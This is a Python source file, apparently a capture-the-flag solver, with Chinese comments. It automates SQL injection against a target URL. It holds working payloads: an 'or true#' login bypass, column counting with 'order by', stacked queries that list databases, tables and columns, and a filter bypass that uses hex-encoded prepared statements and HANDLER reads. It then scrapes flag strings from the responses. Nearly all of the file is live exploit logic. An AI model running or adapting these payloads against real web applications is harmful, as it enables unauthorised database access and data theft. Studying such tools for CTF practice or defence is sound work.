from urllib.parse import urlencode
import requests
import re
import copy
import binascii

from sql_injection.sql_injection_tester import SQLInjectionTester
from sql_injection.sql_injection_analyser import Analyser
from sql_injection.sql_injection_chooser import Chooser



#开发post下的传输
#初步完成一个对post的request包的提取和response转换为代码形式

#1、Analyser完成解析工作--解析request即可
#2、Tester完成注入点的工作--测试request，通过response返回网页结果探测
#3、Chooser完成选择注入点的工作--从上面获取注入点
#4、Checker完成注入工作--开始注入



class SQLInjectionChecker(SQLInjectionTester):
    def __init__(self, url):
        self.url = url
        super().__init__(url)
        self.injection_points = super().find_injection_point(self.url)
        self.noallow_list = self.check_keyword_noallow(self.injection_points)
        self.analyser = Analyser()
        self.chooser = Chooser()

    def check_keyword_noallow(self,list_input):
        """测试是否有关键字被禁用"""

        keyword_list = ["select","update","delete","drop","insert","where"]
        noallow_list = []
        expect_string = "preg_match"
        for i in range(len(keyword_list)):
            c_url = self.change_url(keyword_list[i],list_input)
            response = requests.get(c_url)
            if response.status_code == 200:
                webpage_content = response.text
                if expect_string in webpage_content:
                    noallow_list.append(keyword_list[i])
                else:
                    pass
            else:
                print("网页无法请求")
        
        # if(noallow_list.__len__ != 0):
        #     print("被禁用的值为："+' '.join(str(x) for x in noallow_list))
        # else:
        #     print("无禁用参数")

        return noallow_list
    
    def print_properties(self):
        properties = vars(self)
        for key, value in properties.items():
            print(f"{key}: {value}")
    
    def change_url(self,var_keyword,list_keyword):
        """修改url"""

        list_t = copy.deepcopy(list_keyword)

        for i in range(0,len(list_t),1):
            list_t[i][1] = var_keyword

        keyword_dict = {key: value for key,value in list_t}
        # for item in list_keyword:
        #     keyword_dict[item] = var_keyword

        return super().update_url_params(keyword_dict)

    def check_injection_and_find_flag(self, injection_point):
        """测试万能密码登陆"""
        # 使用万能用户名和密码进行注入测试
        payload = {
            'username': "admin' or true#",
            'password': "admin' or true#"
        }
        if injection_point:
            payload[injection_point] = "admin' or true#"

        url = self.url.split('?')[0] + '?' + urlencode(payload)
        response = requests.get(url)

        # 使用正则表达式查找包含flag的内容
        flag_matches = re.findall(r'flag\{[^\}]*\}', response.text)
        if flag_matches:
            for match in flag_matches:
                pass
            return match
        else:
            print("未发现flag内容")
            return ""

    def start(self):
        # 1、0、检测关键字的禁用列表；是否有select
        username_found = False
        password_found = False
        for item in self.injection_points:
            if 'username' in item:
                username_found = True
            if 'password' in item:
                password_found = True
        if username_found and password_found:
            flag = self.check_injection_and_find_flag(self.injection_points[0][0])
            if flag:
                print("万能密码起作用，flag:", flag)
                return
            else:
                print("万能密码不起作用")
        flag_select = False
        if "select" in self.noallow_list:
            flag_select = True
        # 0、确认是什么注入类型
        # 后期加入判断，即将里面的”1“修改了
        # 1、确认用什么来查询字段
        # 2、确认有几个字段
        # 这里需要添加一个检测空格是否禁用，符号是否禁用
        # 确认一般为参数值+闭合符号+order by n;#
        n = 1
        order_key = "1"+self.injection_points[0][1]+" order by "+str(n)+";#"
        order_url = self.change_url(order_key,self.injection_points)
        response = requests.get(order_url).text.lower()
        while "error" not in response and "unknown" not in response:
            order_key = "1"+self.injection_points[0][1]+" order by "+str(n)+";#"
            order_url = self.change_url(order_key,self.injection_points)
            response = requests.get(order_url).text.lower()
            n+=1
        n = n - 2
        # 3、展示数据库
        databases_key = "1"+self.injection_points[0][1]+"; show databases;"
        databases_url = self.change_url(databases_key,self.injection_points)
        databases_context_list = self.analyser.analyze_html(databases_url)
        # 引出新问题：回显内容不同，需要进行判断
            # => 引入新类Analyser
        # 4、展示数据表
        table_key = "1"+self.injection_points[0][1]+"; show tables;"
        table_url = self.change_url(table_key,self.injection_points)
        table_context_list = self.analyser.analyze_html(table_url)
        option_database = self.chooser.choose_option(databases_context_list)
        option_table = self.chooser.choose_option(table_context_list)
        # 5、根据选择的数据表爆字段
        # 6、检测字段类型，如果是数字，加反引号，不是就正常处理
        if not table_context_list[option_table].isdigit():
            columns_key = "1"+self.injection_points[0][1]+"; show columns from "+table_context_list[option_table]+";#"
        else:
            columns_key = "1"+self.injection_points[0][1]+"; show columns from `"+table_context_list[option_table]+"`;#"
        # 7、0、检测关键字的禁用列表；是否有select
            
        if flag_select:
        # 有=>
        # 7、1、绕过滤
            if table_context_list[option_table].isdigit():
                pass_key = "select * from `"+table_context_list[option_table]+"`"
            else:
                pass_key = "select * from "+table_context_list[option_table]
            payload = "1"+self.injection_points[0][1]+";SeT@a="+"0x"+binascii.hexlify(pass_key.encode()).decode()+";prepare execsql from @a;execute execsql;#"
            response = requests.get(self.change_url(payload,self.injection_points)).text
            flag = re.search(r'flag\{[^\}]+\}', response)
            if flag:
                print("Flag found: ", flag.group())
            else:
                print("No flag found.")
        # 7、2、使用handler
            if table_context_list[option_table].isdigit():
                pass_key = "1"+self.injection_points[0][1]+";handler `"+table_context_list[option_table]+"`"+" open;handler `"+table_context_list[option_table]+"`"+" read first;"+"handler `"+table_context_list[option_table]+"` close;"
            else:
                pass_key = "1"+self.injection_points[0][1]+";handler "+table_context_list[option_table]+" open;handler "+table_context_list[option_table]+" read first;"+"handler "+table_context_list[option_table]+" close;"
            response = requests.get(self.change_url(pass_key,self.injection_points)).text
            flag = re.search(r'flag\{[^\}]+\}', response)
            if flag:
                print("Flag found: ", flag.group())
            else:
                print("No flag found.")
        # 无=>暂时不考虑